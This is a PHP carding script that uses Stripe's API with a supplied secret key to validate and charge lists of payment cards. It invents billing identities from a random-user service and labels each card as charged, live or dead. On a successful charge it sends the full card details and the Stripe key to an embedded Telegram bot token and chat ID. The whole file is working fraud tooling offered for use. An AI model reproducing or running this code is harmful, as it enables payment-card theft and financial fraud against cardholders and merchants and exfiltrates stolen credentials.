<?php
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
#=============[𝙎𝙏𝙍𝙄𝙋𝙀 𝘼𝙋𝙄 𝘽𝙔 FARES]========#
//================ [ FUNCTIONS & LISTA ] ===============//
function random_strings($length_of_string) 
{
    $str_result2 = '0123456789'; 
    return substr(str_shuffle($str_result2),  
                       0, $length_of_string); 
}

 
function GetStr($string, $start, $end)
{
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}

function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
$stl = "℘";
//--------[amount]-------//
if(isset($_GET['cst'])){
$amt = $_GET['cst'];
}
$amt = "$amt.0".random_strings(1);
if(empty($amt)) {
    $amt = '0.5';
}
    $chr = $amt * 100;

    
    ///----currency
    if(isset($_GET['cur'])){
$cur = $_GET['cur'];
}
if (($cur == '€') || ($cur == 'eur'))
{
$sy = '€';
$cur = 'eur';
}
elseif(($cur == '£') || ($cur == 'gbp'))
{
$sy = '£';
$cur = 'gbp';
}
elseif(($cur == '₹') || ($cur == 'inr'))
{
$sy = '₹';
$cur = 'inr';
}
if(empty($cur)) {
    $sy = '$';
    $cur = 'usd';
}
if(empty($sy))    
{
$sy = '$';
}
    
   //-----------[SK]-----//
if(isset($_GET['sec'])){
    $get_sk = $_GET['sec'];
}
$sk= trim($get_sk);
$sks = explode(";", $sk);
$sk = $sks[array_rand($sks)];

//------[Randomize Description]------//
$word = array(
1 => 'sex Donate', 
2 => 'Op Donations',
3 => 'RCN Receipt',                
4 => '0p Receipt',                 
5 => 'Op Reciept',
); 
$rnd = array_rand($word);
$dnt = $word[$rnd];


//echo "$state $city $postcode $street $name $last $email";
//------[CC FROM USER]-------//
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
$bin = substr($cc , 0 , 6);
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://bins.su/');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_POST, 1);
    $headers = array();
    $headers[] = 'Accept-Language: en-US,en;q=0.9';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Host: bins.su';
    $headers[] = 'Origin: http://bins.su';
    $headers[] = 'Referer: http://bins.su/';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&bank=&country=');
$result = curl_exec($ch);
    $bincap1 = trim(strip_tags(getStr($result, '<td>Bank</td></tr><tr><td>','</td>')));
    $country = (getStr($result, '<td>'.$bincap1.'</td><td>','</td>'));
    $country2 = (getStr($result, '<td>'.$bincap1.'</td><td>','</td>'));

    
  if(empty($country))
{
  $country = "US";
  $country2 = "US";
}
if($country == "SG")
{
    $country2 = "US";
}
  //  $country = $country2;
//==================[Randomizing Details]======================//
details:
$get = file_get_contents('https://randomuser.me/api/1.2/?nat='.$country2.'');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
if(empty($name))
{
    $name = "John";
    $last = "gips";
}
if(empty($state))
{
    $country2 = "US";
    goto details;
}
$name = trim($name);
$last = trim($last);
$email = "$name$last"."@gmail.com";
//================= [ CURL REQUESTS ] =================//
$start = microtime(true);
#===========[1st REQ]=======#
while(true)
{
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$postcode.'&billing_details[address][country]='.$country.'&billing_details[name]='.$name.'+'.$last.'&billing_details[email]='.$email.'');  
$r1 = curl_exec($ch);  
if (strpos($r1, "rate_limit"))   
{  
    continue;  
}  
break;  
}  
//===========[𝙀𝙓𝙏𝙍𝘼𝘾𝙏𝙄𝙊𝙉]=========//
$tok = trim(strip_tags(getStr($r1, '"id": "', '"')));

$check1 = Getstr($r1,'"cvc_check": "','"');
$msg = Getstr($r1,'"decline_code": "','"');
$msg2 = Getstr($r1,'"message": "','"');
//==========[ #1 𝙍𝙚𝙦 𝘾𝙃𝙀𝘾𝙆𝙄𝙉𝙂]===//
if(empty($tok))
{
    $msg2 = Getstr($r1,'"message": "','"');
    $msg2 = "$msg2 [R1]";
    $r = '1';
    $end = microtime(true);
$time = ($end - $start);
$time = round($time,2);
    goto fuck;
}
  //=============[2nd REQ]=======//
$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency='.$cur.'&payment_method_types[]=card&description='.$dnt.'&payment_method='.$tok.'&confirm=true&off_session=true');  
$r2 = curl_exec($ch);  
if (strpos($r2, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}
$end = microtime(true);
$time = ($end - $start);
$time = round($time,2);
$r = '2';
//=======[#2 𝙀𝙓𝙏𝙍𝘼𝘾𝙏𝙄𝙊𝙉]=========//
$msg2 = Getstr($r2,'"message": "','"');
$msg = Getstr($r2,'"decline_code": "','"');
$receipturl = trim(strip_tags(getStr($r2, '"receipt_url": "', '"')));
$risklevel = trim(strip_tags(getStr($r2, '"risk_level": "', '"')));
//=======[#2𝙀 𝙍𝙀𝙎𝙐𝙇𝙏𝙎]=========//
if ((strpos($r2, '"status": "succeeded"')) || (strpos($r2, '"seller_message": "Payment complete."'))){
  
$respl = "
$stl CHARGED : <font color='#90EE90'>$lista</font><br>
$stl 𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 » [𝘊𝘝𝘝-𝘊𝘏𝘈𝘙𝘎𝘌𝘋-𝘚𝘶𝘤𝘤𝘦𝘴𝘴] <br>
$stl 𝘊𝘏𝘈𝘙𝘎𝘌𝘋 𝘈𝘮𝘰𝘶𝘯𝘵 »  $sy $amt <br>
$stl 𝘊𝘰𝘶𝘯𝘵𝘳𝘺 »  $country <br>
$stl 𝘈𝘱𝘪 𝘉𝘠 » @A_AAQ ×× <br>
$stl 𝘙𝘦𝘤𝘦𝘪𝘱𝘵 »  <a href=$receipturl>Invoice</a><br>
";
$tg1 = "༮ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 ✅ ༮

⋅  ────
$stl CC » <code>$lista</code>
$stl 𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 » [𝘊𝘝𝘝-𝘊𝘏𝘈𝘙𝘎𝘌𝘋-𝘚𝘶𝘤𝘤𝘦𝘴𝘴!]
$stl 𝘊𝘏𝘈𝘙𝘎𝘌𝘋 𝘈𝘮𝘰𝘶𝘯𝘵 » $sy $amt $aapr  
$stl 𝘊𝘰𝘶𝘯𝘵𝘳𝘺 » $country  
$stl 𝘙𝘦𝘤𝘦𝘪𝘱𝘵  » Here 
$stl SK - $sk
⋅  ────
༮ 𝗔 𝗣 𝗜  -  @B3BBG  ༮
";
$apiToken = '6197527672:AAHKXhPr-XkXESVsCdMqaMZ6lyRAms_iYqQ'; //Bot Api Token, You get it from
$forward1 = ['chat_id' => '5270697648','text' => $tg1,'parse_mode' => 'HTML' ];
$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
goto hits;
  }
elseif ((strpos($r2,'insufficient_funds')) || (strpos($r1,'insufficient_funds'))){

$respl = "
$stl CVV : <font color='yellow'>$lista</font><br>
$stl Reason : $msg2 <br>
$stl Country : $country <br>
$stl Time Taken : $time s<br>
";  
 goto hits;
  }
  elseif ((strpos($r2,'"cvc_check": "pass"')) || (strpos($r1,'"cvc_check": "pass"'))){

$respl = "
$stl CVV : <font color='yellow'>$lista</font><br>
$stl Reason : $msg2 <br>
$stl Country : $country <br>
$stl Time Taken : $time s<br>
";
goto hits;
  
  }
  elseif ((strpos($r2, 'incorrect_cvc')) || (strpos($r1, 'incorrect_cvc'))) {
$respl = "
$stl CCN : <font color='cyan'>$lista</font><br>
$stl Reason : $msg2 <br>
$stl Country : $country <br>
$stl Time Taken : $time s<br>
";
goto hits;
  }
else {
    
 goto fuck;
 
  }
  #------------#
fuck:
#########################[Responses Show Like]############################
$respl = "
$stl CC: <font color='red'>$lista</font><br>
$stl Reason : $msg2 [$msg] <br>
$stl Country : $country <br>
$stl Time Taken : $time s<br>
";
hits:
echo "<p style='text-align:left;color:white;text-shadow: 0 0 3px $cl' class='uk-margin-small-top'><b> $respl ";
#-----------#   
curl_close($ch);
ob_flush();
?>